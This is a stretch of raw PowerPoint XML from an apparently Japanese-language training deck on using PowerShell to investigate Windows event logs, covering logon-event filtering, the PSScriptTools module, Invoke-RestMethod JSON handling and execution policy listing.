              </a:rPr>
              <a:t>&gt;&lt;/Event&gt;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1AB04DED-3485-4DC9-82A7-B52116CC7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993" y="5322452"/>
            <a:ext cx="4850646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spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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かなり面倒な作業になってしまう。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20150781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C9D6C0-C721-DBFF-7A92-26446113B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イベントログ </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| Convert-</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>EventLogRecord</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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F367C3D-79AA-4DB9-96AA-86D76F1856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7A86CE7-E635-24D8-B6BE-9014E3B9FC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49</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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6C0ED8F6-E8D9-EB20-4005-262D8BFE1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992" y="903347"/>
            <a:ext cx="10440989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spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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Jeff Hicks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氏の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PS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モジュール「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PowerShell Scripting Tools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」を利用する。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B73D0D2-5139-4773-1B72-937A945A8870}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="1268760"/>
            <a:ext cx="10422016" cy="42473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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>FilterHashtable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> @{LogName="Security"; ID=4624} -Max 1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Convert-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>EventLogRecord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LogName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>            : Security</a:t>
            </a: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RecordType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>         : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>情報</a:t>
            </a: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TimeCreated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        : 2022/11/20 9:07:08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ID                 : 4624</a:t>
            </a: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SubjectUserSid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>     : S-1-5-18</a:t>
            </a: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SubjectUserName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    : LNV2202$</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .</a:t>
            </a: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TargetUserName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>     : SYSTEM</a:t>
            </a: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TargetDomainName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>   : NT AUTHORITY</a:t>
            </a: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TargetLogonId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>      : 0x3e7</a:t>
            </a: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LogonType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>          : 5</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .</a:t>
            </a:r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59705FED-EBEA-AB73-24D1-E646A8C99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304" y="5646730"/>
            <a:ext cx="10439400" cy="677108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>
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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Install-Module </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>PSScriptTools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で</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>PSGallery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から導入できる。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en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Import-Module </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>PSScriptTools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で読み込む。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39011268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C9D6C0-C721-DBFF-7A92-26446113B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イベントログ </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| Convert-</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>EventLogRecord</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>の使用例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F367C3D-79AA-4DB9-96AA-86D76F1856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7A86CE7-E635-24D8-B6BE-9014E3B9FC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50</a:t>
            </a:fld>
            <a:endParaRPr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B73D0D2-5139-4773-1B72-937A945A8870}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="886764" y="854127"/>
            <a:ext cx="10419932" cy="45550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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>FilterHashtable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> @{LogName="Security"; ID=4624;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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>StartTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="2023/03/06 07:00:00"; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>EndTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="2023/03/06 23:00:00"}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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Convert-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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EventLogRecord</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>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Where-Object {($_.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LogonType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -eq 10) -or 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              ($_.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ProcessName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -like "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>*sshd.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>")}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Select-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>TimeCreated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>TargetUserName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LogonType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>IpAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>,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@{Name = 'Process'; Expr = {Split-Path $_.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Processname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Leaf}}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Format-Table</a:t>
            </a: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TimeCreated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>         </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>TargetUserName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LogonType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>IpAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    Process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-----------         -------------- --------- ---------    -------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2023/03/06 20:33:58 swat           10        172.16.250.4 svchost.exe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2023/03/06 7:55:15  swat           8         -            sshd.exe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2023/03/06 7:55:15  swat           3         -            sshd.exe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2023/03/06 7:55:15  sshd_9780      5         -            sshd.exe</a:t>
            </a:r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59705FED-EBEA-AB73-24D1-E646A8C99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304" y="5538718"/>
            <a:ext cx="10439400" cy="677108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>
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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SSH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接続された場合、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Security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ログには接続元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IP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アドレスが残らない。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en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>LogName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="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Openssh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/Operational"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の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Message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に残る。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2603A2F-DB7F-CB11-0558-5E736B4027FB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7140116" y="4437113"/>
            <a:ext cx="3204356" cy="900099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 dirty="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630728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E02B95-BB2A-96A9-B09F-C1FA2E781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イベントログ </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| REST API</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>と</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>JSON</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>形式の処理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6528774-EC94-84BD-E996-DAAAED38D8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9001607-93FD-F9B6-D5B3-65846ABACD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51</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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D711B53F-3283-0543-EC1C-6CB274B1C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20" y="959820"/>
            <a:ext cx="6516724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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr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1040E6CC-D0BF-F722-9B35-2E206A870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1362254"/>
            <a:ext cx="10440989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返ってきた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JSON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文字列は、自動的にオブジェクトに変換される。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748C6E3-FCD5-BACD-6871-92458B9A1696}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="1772816"/>
            <a:ext cx="10439401" cy="22467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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> "https://dns.google/resolve?name=ntt.com&amp;type=mx"</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1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Status   : 0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>...</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1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CD       : False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Question : {@{name=ntt.com.; type=15}}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Answer   : {@{name=ntt.com.; type=15; TTL=21498; data=10 ntt-com.mail.protection.outlook.com.}}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36752CF-001B-D905-2F77-4DFE0B27FE6E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="4120336"/>
            <a:ext cx="10439401" cy="1785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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> "https://dns.google/resolve?name=ntt.com&amp;type=mx" |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Select-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ExpandProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Answer</a:t>
            </a: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name     type  TTL data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----     ----  --- ----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ntt.com.   15 3114 10 ntt-com.mail.protection.outlook.com.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15116715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EEA9BDC9-0FA4-4A9C-4460-B9BB82A5C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環境整備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C90F4F6-EC59-D5CD-6BFE-22BD3CA9B56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31236F-2BB3-75BB-A222-739FE3A842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52</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0122E30C-29F6-58A0-2CE3-13CAE8321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7868" y="4941168"/>
            <a:ext cx="6407830" cy="126014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numCol="3" spcCol="288000">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/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基本事項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プロセス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ネットワーク</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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ファイル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永続化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イベントログ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>環境整備</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" b="1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学習案内</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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まとめ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" dirty="0">
              <a:latin typeface="+mn-ea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7311027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6BD6AA64-93B1-808A-C96B-9683AA2D2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環境整備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B4FA27D-E5FE-59C9-DDBB-3388C923F8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52381FE-3638-7DC8-19EC-7B15CD9B93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53</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{72D00AEF-6B2B-55C3-D84E-79E1A2D32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993" y="903347"/>
            <a:ext cx="5211008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spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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スクリプト実行ポリシー。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2F02B9D-759C-2793-18F4-5B46E7EA97F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="1268760"/>
            <a:ext cx="4850646" cy="2708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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ExecutionPolicy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -List</a:t>
            </a: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        Scope </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ExecutionPolicy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        ----- ---------------</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>MachinePolicy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>       Undefined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   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>UserPolicy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
